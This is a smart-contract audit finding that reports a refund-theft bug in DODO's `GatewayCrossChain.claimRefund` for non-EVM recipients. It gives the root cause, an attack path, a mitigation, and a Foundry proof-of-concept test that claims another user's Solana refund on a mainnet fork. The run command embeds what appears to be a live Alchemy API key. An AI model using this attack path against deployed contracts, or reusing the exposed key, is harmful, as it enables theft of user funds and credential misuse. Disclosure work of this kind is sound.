# Refunds on non evm addresses can be stolen by anyone

### Summary

When a call is made to the gateway to withdraw to a non evm chain from `GatewayCrossChain.sol`, if the transaction reverts the `onRevert` function will be called. The logic here applies the refund to the intended recipient. An issue arises when the recipient is a non evm address that allows anyone to claim their refund.

### Root Cause

The root cause is in how the receiver is checked against msg.sender in the `claimRefund` function.  For non evm addresses, the receiver variable would just be set to the msg.sender then checked against msg.sender again. This will always be true then allowing anyone to claim the refund of another user.
https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/contracts/GatewayCrossChain.sol#L574C5-L579C6
```Solidity
address receiver = msg.sender;
        if(refundInfo.walletAddress.length == 20) {
            receiver = address(uint160(bytes20(refundInfo.walletAddress)));
        }
        require(bots[msg.sender] || msg.sender == receiver, "INVALID_CALLER");
        require(refundInfo.externalId != "", "REFUND_NOT_EXIST");
```

### Internal Pre-conditions

1. Users are able to initiate cross chain transfers through DODO

### External Pre-conditions

1. Gateway needs to be up and running allowing cross chain swaps to non evm addresses

### Attack Path

1. user calls `depositAndCall` wishing to send funds to Solana
2. `onCall` is triggered in `GatewayCrossChain` contract to withdraw the funds to the destination chain
3. Transaction reverts and a callback is made to `onRevert` to refund the intended recipient
4. Any other user can call `claimRefund` with that users external id and claim it

### Impact

Loss of refund for users

### PoC

Add the following test function to `GatewayCrossChain.t.sol` and run `forge test --match-test test_ClaimRefundVulnerability --fork-url https://zetachain-mainnet.g.alchemy.com/v2/CC1_RdNDkmzMtPzhbJ3KIsvPMjvu6vM1 -vvv`
```Solidity
function test_ClaimRefundVulnerability() public {
        // Setup: Create refunds for both EVM and non-EVM addresses
        bytes32 externalIdEVM = keccak256(abi.encodePacked("evm_refund"));
        bytes32 externalIdSolana = keccak256(abi.encodePacked("solana_refund"));

        uint256 refundAmount = 100 ether;
        token1Z.mint(address(gatewayCrossChain), 3 * refundAmount);

        vm.startPrank(address(gatewayZEVM));

        // Create EVM refund (20 bytes - should only be claimable by user2)
        gatewayCrossChain.onAbort(
            AbortContext({
                sender: abi.encode(address(this)),
                asset: address(token1Z),
                amount: refundAmount,
                outgoing: false,
                chainID: 7000,
                revertMessage: bytes.concat(
                    externalIdEVM,
                    abi.encodePacked(user2)
                ) // 20 bytes
            })
        );

        // Create Solana refund (32 bytes - non-EVM)
        gatewayCrossChain.onAbort(
            AbortContext({
                sender: abi.encode(address(this)),
                asset: address(token1Z),
                amount: refundAmount,
                outgoing: false,
                chainID: 7000,
                revertMessage: bytes.concat(externalIdSolana, solAddress) // 32 bytes
            })
        );

        vm.stopPrank();

        vm.expectRevert("INVALID_CALLER");
        vm.prank(user1);
        gatewayCrossChain.claimRefund(externalIdEVM);

        uint256 user2BalanceBefore = token1Z.balanceOf(user2);
        vm.prank(user2);
        gatewayCrossChain.claimRefund(externalIdEVM);
        assertEq(token1Z.balanceOf(user2), user2BalanceBefore + refundAmount);

        vm.prank(user1);
        gatewayCrossChain.claimRefund(externalIdSolana);

    }
```

### Mitigation

The refund address should be whatever evm wallet initiated the cross chain transfer, not the intended recipient on the other chain.
